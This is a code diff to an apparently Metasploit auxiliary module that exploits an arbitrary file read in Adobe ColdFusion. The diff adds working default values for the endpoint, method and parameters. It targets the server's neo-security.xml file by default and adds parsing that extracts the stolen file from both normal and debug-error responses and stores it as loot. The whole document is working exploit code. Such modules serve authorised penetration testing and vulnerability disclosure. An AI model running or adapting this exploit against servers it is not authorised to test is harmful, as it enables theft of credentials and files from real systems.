@@ -17,7 +17,9 @@ class MetasploitModule < Msf::Auxiliary
           an arbitrary file from the server.
 
           To run this module you must provide a valid ColdFusion Component (CFC) endpoint via the CFC_ENDPOINT option,
-          and a valid remote method name from that endpoint via the CFC_METHOD option.
+          and a valid remote method name from that endpoint via the CFC_METHOD option. By default an endpoint in the
+          ColdFusion Administrator (CFIDE) is provided. If the CFIDE is not accessible you will need to choose a
+          different CFC endpoint, method and parameters.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -42,9 +44,9 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RHOST('0.0.0.0'),
         OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true]),
         OptString.new('TARGETFILE', [true, 'The target file to read, relative to the wwwroot folder.', '../lib/neo-security.xml']),
-        OptString.new('CFC_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', nil]),
-        OptString.new('CFC_METHOD', [true, 'The target ColdFusion Component (CFC) remote method name', nil]),
-        OptString.new('CFC_METHOD_PARAMETERS', [false, 'Additional target ColdFusion Component (CFC) remote method parameters to supply via a GET request (e.g. "param1=foo&param2=hello%20world")', ''])
+        OptString.new('CFC_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', '/CFIDE/wizards/common/utils.cfc']),
+        OptString.new('CFC_METHOD', [true, 'The target ColdFusion Component (CFC) remote method name', 'wizardHash']),
+        OptString.new('CFC_METHOD_PARAMETERS', [false, 'Additional target ColdFusion Component (CFC) remote method parameters to supply via a GET request (e.g. "param1=foo&param2=hello%20world")', 'inPassword=foo'])
       ]
     )
   end
@@ -94,15 +96,37 @@ class MetasploitModule < Msf::Auxiliary
       'vars_post' => { '_variables' => json_variables }
     )
 
-    # The TARGETFILE contents will be emitted after the WDDX result of the remote CFC_METHOD. So we search for the
-    # TARGETFILE contents after the closing wddxPacket tag in the response body.
+    file_data = nil
+
+    # The TARGETFILE contents will be emitted after the WDDX result of the remote CFC_METHOD. A _cfclient call
+    # will always return a struct with a 'variables' key via ComponentFilter.invoke and by selecting a returnFormat of
+    # wddx, we know to have a closing wddxPacket to search for. So we search for the TARGETFILE contents after
+    # the closing wddxPacket tag in the response body.
     wddx_packet_tag = '</wddxPacket>'
 
-    unless res && res.code == 200 && (res.body.include? wddx_packet_tag)
-      fail_with(Failure::UnexpectedReply, 'Failed to read the file. Ensure both the CFC_ENDPOINT and CFC_METHOD are set correctly.')
+    if res && res.code == 200 && (res.body.include? wddx_packet_tag)
+
+      file_data = res.body[res.body.index(wddx_packet_tag) + wddx_packet_tag.length..]
+
+      # If the default CFC options were used, we know the output will end with the result of calling wizardHash. So we can
+      # remove the result which is a SHA1 hash and two 32 byte random strings, comma seperated and a trailing space.
+      if datastore['CFC_ENDPOINT'] == '/CFIDE/wizards/common/utils.cfc' && datastore['CFC_METHOD'] == 'wizardHash'
+        file_data = file_data[0..file_data.length - (40 + 32 + 32 + 2 + 1) - 1]
+      end
+    else
+      # ColdFusion has a non-default option 'Enable Request Debugging Output', which if enabled may return a HTTP 500
+      # or 404 error, while also including the arbitrary file read output. We detect this here and retrieve the file
+      # output which is pre-pended to the error page.
+      request_debugging_tag = '<!-- " ---></TD></TD></TD></TH></TH></TH>'
+
+      if res && (res.code == 404 || res.code == 500) && (res.body.include? request_debugging_tag)
+        file_data = res.body[0, res.body.index(request_debugging_tag)]
+      end
     end
 
-    file_data = res.body[res.body.index(wddx_packet_tag) + wddx_packet_tag.length..]
+    if file_data.blank?
+      fail_with(Failure::UnexpectedReply, 'Failed to read the file. Ensure both the CFC_ENDPOINT, CFC_METHOD and CFC_METHOD_PARAMETERS are set correctly and that the endpoint is accessible.')
+    end
 
     if datastore['STORE_LOOT'] == true
       print_status('Storing the file data to loot...')
